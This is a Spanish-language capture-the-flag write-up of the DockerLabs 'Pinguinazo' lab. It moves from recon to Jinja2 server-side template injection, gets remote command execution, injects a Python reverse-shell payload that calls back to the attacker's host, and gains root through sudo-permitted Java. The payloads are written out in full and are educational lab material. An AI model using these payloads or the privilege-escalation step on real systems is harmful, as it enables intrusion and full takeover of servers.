# Pinguinazo — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** Fácil  
**OS:** Linux  
**Técnicas:** SSTI (Jinja2), RCE, Reverse Shell, Sudo + Java PrivEsc (GTFOBins)

---

## Reconocimiento

Escaneo inicial con Nmap:

```bash
nmap -sV 172.17.0.2
```

Puerto descubierto: **5000/tcp — HTTP** (aplicación Flask).

Lanzamos Gobuster en paralelo mientras inspeccionamos la web:

```bash
gobuster dir -u http://172.17.0.2:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 4 --no-error
```

---

## Análisis de la aplicación web

La web expone un formulario de registro con varios campos. Al introducir un valor en el campo **PinguNombre**, la aplicación lo devuelve renderizado con un `Hello` delante.

Esto sugiere que el valor se procesa directamente en un motor de plantillas — vector típico de **SSTI (Server-Side Template Injection)**.

---

## Explotación — SSTI Jinja2

### Confirmación de SSTI

Introducimos en el campo PinguNombre:

```
{{7*7}}
```

La aplicación devuelve `49` — confirma que el motor de plantillas ejecuta la expresión.

### Identificación del motor

```
{{7*'7'}}
```

Resultado: `7777777` → motor identificado: **Jinja2 (Python)**.

### RCE — Ejecución remota de comandos

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

La aplicación devuelve `uid=1001(pinguinazo)` — RCE confirmado.

### Reverse Shell

Con `nc -lvnp 4444` escuchando en nuestra máquina, inyectamos el siguiente payload:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("172.17.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'').read()}}
```

![Foto1](assets/1.png)

Obtenemos shell como usuario **pinguinazo**:

![Foto2](assets/2.png)

---

## Escalada de privilegios

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```
(ALL) NOPASSWD: /usr/bin/java
```

El usuario puede ejecutar `java` como root sin contraseña. Consultamos **GTFOBins** para Java.

Creamos un archivo `Shell.java`:

```java
public class Shell {
    public static void main(String[] args) throws Exception {
        new ProcessBuilder("/bin/sh").inheritIO().start().waitFor();
    }
}
```

Compilamos y ejecutamos:

```bash
javac Shell.java
sudo java Shell
```

![Foto2](assets/3.png)

Shell como **root** obtenida.

---

## Conclusión

|Fase|Técnica|
|---|---|
|Reconocimiento|Nmap, Gobuster|
|Acceso inicial|SSTI Jinja2 → RCE → Reverse Shell|
|Escalada|sudo + Java → GTFOBins|

**CVE relacionado:** SSTI en Flask/Jinja2 no tiene CVE específico — es un fallo de configuración por renderizado inseguro de input de usuario.

## Lo que aprendí

- **Metodología de detección de SSTI** — cuando una aplicación refleja input del usuario, probar `{{7*7}}` es el primer paso para confirmar la inyección. Un resultado numérico indica que el motor está evaluando expresiones.
- **Fingerprinting del motor Jinja2** — `{{7*'7'}}` devolviendo `7777777` identifica Jinja2 de forma única, lo que determina la sintaxis del payload a usar.
- **Estructura del payload RCE en Jinja2** — acceder a los internals de Python a través de `request.application.__globals__.__builtins__.__import__('os')` para llegar a `popen()` y ejecutar comandos del sistema.
- **Escape de comillas en payloads anidados** — incrustar un one-liner de Python dentro de un `popen()` de Jinja2 requiere gestionar cuidadosamente las comillas simples y dobles para no romper el contexto del string.
- **GTFOBins — privesc con Java via sudo** — cuando un usuario puede ejecutar `java` como root mediante sudo, un `Shell.java` mínimo compilado con `javac` y ejecutado con `sudo java Shell` genera una shell root a través de `ProcessBuilder`.